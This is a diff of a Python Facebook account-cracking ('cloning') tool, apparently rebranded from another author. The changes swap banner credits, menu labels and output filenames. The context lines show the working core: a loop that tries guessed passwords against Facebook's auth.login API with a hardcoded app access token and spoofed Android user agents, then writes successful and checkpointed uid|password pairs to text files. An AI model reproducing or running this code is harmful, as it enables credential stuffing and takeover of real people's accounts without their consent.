@@ -398,18 +398,18 @@ logo = ("""\033[1;32m
                                                                                                                                                                                                                                                                                                                                                                                                                    
   \033
 __________________×__×____________________
-  
-  𝘼𝙪𝙩𝙝𝙤𝙧   :  𝑺𝑰𝑳𝑬𝑵𝑻 𝑯𝑨𝑪𝑲𝑬𝑹
  
-  𝙂𝙞𝙩𝙝𝙪𝙗   :  𝑺𝑰𝑳𝑬𝑵𝑻-786
+  𝘼𝙪𝙩𝙝𝙤𝙧   :  HACKE_OMAR+ALRARHONY
+ 
+  𝙂𝙞𝙩𝙝𝙪𝙗   :  OmarMuhammed-Hack-Fikeng
 
-  𝙁𝙖𝙘𝙚𝙗𝙤𝙤𝙠 :  𝑴𝑹 𝑫𝑬𝑽𝑰𝑳
+  𝙁𝙖𝙘𝙚𝙗𝙤𝙤𝙠 :  OMAR MUHAMMED JEHAD MASRAWY
   
-  𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 :  +92*********?
+  𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 :  +92629****
   
-   𝙏𝙀𝘼𝙈    :   𝑨𝑳𝑶𝑵𝑬 𝑳𝑶𝑽𝑬𝑹
+   𝙏𝙀𝘼𝙈    :   TEAM ZEYAD +OMAR +ALTARHUNE
 
-                𝑬𝑵𝑱𝑶𝒀  𝑭𝑹𝑬𝑬 𝑻𝑶𝑶𝑳𝑺
+                FREE
 __________________×__×____________________\033[1;37m""")
 
 class Main:
@@ -423,8 +423,8 @@ class Main:
 		print("\n [1] File Cloning")
 		print(" [2] Public Cloning")
 		print(" [3] Create File")
-		print(" [4] 2005-10 Cloning")
-		print(" [5] 2011-12 Cloning")
+		print(" [4] 2006-2007 Cloning")
+		print(" [5] 2008 Cloning")
 		print(" [6] Exit Programming\n")
 		JAHIED =input(" Choose : ")
 		if JAHIED in ["1", "01"]:
@@ -838,7 +838,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ 𝑺𝑯𝑹 ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ OMAR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -855,15 +855,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ 𝑺𝑯𝑹,𝑶𝑲 ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ OMAR ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-𝑺𝑯𝑹-𝑶𝑲.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2008-Omar.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ 𝑺𝑯𝑹,𝑪𝑷 ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ OMAR.ALTARHONY ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-𝑺𝑯𝑹,𝑪𝑷.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2008-OMAR.C𝑷.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1285,12 +1285,12 @@ class Main:
 				print("\r \033[0;92m[ 𝑺𝑯𝑹,𝑶𝑲 ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-𝑺𝑯𝑹-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2008-OMAR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m [𝑆𝐻𝑅-𝑶𝑲 ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m [OMAR] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-𝑺𝑯𝑹-𝑶𝑲.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2008-omar.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1315,7 +1315,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m 𝑺𝑯𝑹 Paid Tool You Need To Get Approved First\033[1;37m\n")
+		print(" \033[1;32m OMAR Paid Tool You Need To Get Approved First\033[1;37m\n")
 		print(" \033[1;32m Note : Paid Tool \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
